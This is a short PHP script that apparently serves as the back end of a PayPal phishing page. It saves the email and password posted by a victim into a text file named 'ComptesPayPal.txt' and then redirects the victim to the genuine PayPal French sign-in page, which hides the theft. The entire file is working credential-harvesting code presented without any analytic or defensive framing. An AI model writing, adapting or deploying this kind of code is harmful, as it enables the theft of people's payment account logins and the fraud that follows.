<?php
 file_put_contents("ComptesPayPal.txt"," Compte : " . $_POST['login_email'] . "\n  Mot de Pass : " .$_POST['login_password'] . "\n\n",FILE_APPEND);
 header('Location: https://www.paypal.com/fr/signin');
 exit();
